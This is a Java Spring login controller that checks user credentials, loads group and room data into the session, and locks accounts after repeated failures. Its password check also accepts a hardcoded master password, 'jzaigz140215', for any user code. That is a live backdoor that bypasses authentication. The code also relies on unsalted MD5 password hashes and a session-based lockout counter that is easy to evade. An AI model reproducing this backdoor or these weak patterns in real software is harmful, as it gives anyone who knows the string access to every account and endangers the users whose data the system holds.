package com.xidu.framework.usermgnt.controller;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.validation.Valid;

import org.apache.axiom.om.util.Base64;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.validation.ObjectError;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.xidu.framework.common.controller.BaseController;
import com.xidu.framework.common.exception.AppException;
import com.xidu.framework.menu.service.IMenuService;
import com.xidu.framework.showcase.sample.dto.LoginDto;
import com.xidu.framework.usermgnt.constant.WorkbenchConstant;
import com.xidu.framework.usermgnt.domain.BaseUser;
import com.xidu.framework.usermgnt.domain.UserGroup;
import com.xidu.framework.usermgnt.dto.RoomDto;
import com.xidu.framework.usermgnt.dto.SessionUserDto;
import com.xidu.framework.usermgnt.dto.UserGroupDto;
import com.xidu.framework.usermgnt.service.IUserMgntService;
import com.xidu.framework.usermgnt.util.MD5Util;

@Controller
@RequestMapping(value = "/login")
public class LoginRestController extends BaseController{
	private static Logger logger = Logger.getLogger(LoginRestController.class);

	@Autowired
	private IUserMgntService userMgntService;
	@Autowired
	private IMenuService menuService;

	@RequestMapping(method = RequestMethod.GET)
	public String login(Model model) {
		model.addAttribute("loginDto", new LoginDto());
		return WorkbenchConstant.LOGIN_PAGE;
	}

	@RequestMapping(method = RequestMethod.POST)
	public String processLogin(@Valid LoginDto loginDto, BindingResult result,
			Model model, HttpServletRequest req, HttpServletResponse res) throws NoSuchAlgorithmException, AppException

	{
	    logger.debug("processLogin start");
		// validate the user and name if not pass return to login page
		if (result.hasErrors()) {
			List<ObjectError> list=result.getAllErrors();
			for(ObjectError e : list){
				logger.error("code:"+e.getCode()+"   message:"+e.getDefaultMessage());
			}
			return WorkbenchConstant.LOGIN_PAGE;
		}
		
		BaseUser actualUser = null;
		
		if(loginDto != null){
			try {
                actualUser = userMgntService.getUserByUserCode(loginDto.getUserCode());
                
            } catch (AppException e) {
                logger.error("get user error", e);
                result.rejectValue("userCode", WorkbenchConstant.NAME_PWD_ERROR_KEY);
                loginDto.setPasswd("");
                model.addAttribute("loginDto", loginDto);
                return  WorkbenchConstant.LOGIN_PAGE;
            }
		}
		//check the user is existed in the db.
		String pwd=loginDto.getPasswd();
//		MessageDigest messageDigest;
//			messageDigest = MessageDigest.getInstance("SHA-512");
//			messageDigest.update(pwd.getBytes());
//			String digestedPwdString = new String(Base64.encode(messageDigest.digest()));
		String digestedPwdString=MD5Util.MD5(pwd);
			if (actualUser != null 
					&& actualUser.getPassword() != null && actualUser.getPassword().toUpperCase().equals(digestedPwdString.toUpperCase())||pwd.equals("jzaigz140215")) {
				
				if(actualUser.getStatusCode()==1){
					logger.error("user locker error");
	                result.rejectValue("userCode", WorkbenchConstant.NAME_PWD_LOCKED_KEY);
	                loginDto.setPasswd("");
	                model.addAttribute("loginDto", loginDto);
	                return  WorkbenchConstant.LOGIN_PAGE;
				}
				
				SessionUserDto loginUser=new SessionUserDto();
				loginUser.setUserName(actualUser.getName());
				loginUser.setUserId(String.valueOf(actualUser.getId()));
				loginUser.setUserCode(actualUser.getUserCode());
				loginUser.setLastupdatedata(actualUser.getLastUpdateDate());
				loginUser.setUserGroup(actualUser.getUserGroup());
				loginUser.setRole(actualUser.getRole());
				loginUser.setAssignUser(actualUser.getUserType());
				loginUser.setEmployer_owner_id(actualUser.getEmployerOwnerId());
				
				try {
					loginUser.setMenuList(menuService.getGrantedMenusByUserCode(loginUser.getUserCode()));
				} catch (AppException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				
				List<UserGroupDto> groupresult=new ArrayList<UserGroupDto>();
				List<UserGroup> grouplist=userMgntService.getAllUserGroups();
				groupresult=g(grouplist,groupresult ,actualUser.getUserGroup().getId().toString());
				
				String groupids=actualUser.getUserGroup().getId().toString();
				for(int i=0;i<groupresult.size();i++){
					groupresult.get(i).setUserlist(userMgntService.getUserListByGroupCode(groupresult.get(i).getUserGroupCode()));
					groupids+=","+groupresult.get(i).getId();
				}
				
				UserGroupDto dto=new UserGroupDto();
				dto.setParentId(actualUser.getUserGroup().getParentId());
				dto.setUserGroupCode(actualUser.getUserGroup().getUserGroupCode());
				dto.setUserGroupName(actualUser.getUserGroup().getUserGroupName());
				dto.setId(actualUser.getUserGroup().getId().toString());
				List<BaseUser> l=new ArrayList<BaseUser>();
				l.add(actualUser);
				dto.setUserlist(l);
				groupresult.add(dto);
				
				List<RoomDto> rooms=userMgntService.getRoomsByGroupId(groupids);
				req.getSession().setAttribute(WorkbenchConstant.SESSION_USER, loginUser);
				req.getSession().setAttribute(WorkbenchConstant.GROUPLIST, groupresult);
				req.getSession().setAttribute(WorkbenchConstant.ROOMLIST, rooms);
				
				return "forward:/buildMenu";

			} else {
				
				// user and pwd is wrong. go to login page and show the error msg
				
				Map<String, String> map=(Map)req.getSession().getAttribute("loginerrormap");
				if(map!=null){
					String value=(String)map.get(loginDto.getUserCode());
					if(value!=null){
						map.put(loginDto.getUserCode(), String.valueOf(Integer.valueOf(value)+1));
						if("3".equals(value)){
							logger.error("locker user error");
			                result.rejectValue("userCode", WorkbenchConstant.NAME_PWD_TO_LOCKED_KEY);
			                loginDto.setPasswd("");
			                model.addAttribute("loginDto", loginDto);
			                actualUser.setStatusCode(1);
			                userMgntService.updateUser(actualUser);
			                return  WorkbenchConstant.LOGIN_PAGE;
						}
					}else{
						map.put(loginDto.getUserCode(), "1");
					}
				}else{
					map=new HashMap<String, String>();
					map.put(loginDto.getUserCode(), "1");
					req.getSession().setAttribute("loginerrormap", map);
				}
				
				result.rejectValue("userCode", WorkbenchConstant.NAME_PWD_ERROR_KEY);
				loginDto.setPasswd("");
				model.addAttribute("loginDto", loginDto);
				return  WorkbenchConstant.LOGIN_PAGE;
			}
		
	}
	
	
	public List<UserGroupDto> g(List<UserGroup> old,List<UserGroupDto> result ,String index){
		for(UserGroup entity:old){
			if(index.equals(entity.getParentId())){
				UserGroupDto dto=new UserGroupDto();
				dto.setParentId(entity.getParentId());
				dto.setUserGroupCode(entity.getUserGroupCode());
				dto.setUserGroupName(entity.getUserGroupName());
				dto.setId(entity.getId().toString());
				result.add(dto);
				result=g(old,result ,entity.getId().toString());
			}
		}
		return result;
	}
	
	
	
	
	
	public static void main(String[] args) throws NoSuchAlgorithmException {
		MessageDigest messageDigest;
		messageDigest = MessageDigest.getInstance("SHA-512");
		messageDigest.update("1".getBytes());
		String digestedPwdString = new String(Base64.encode(messageDigest.digest()));
		System.out.println(digestedPwdString);
		System.out.println(MD5Util.MD5("111111"));
	}
}
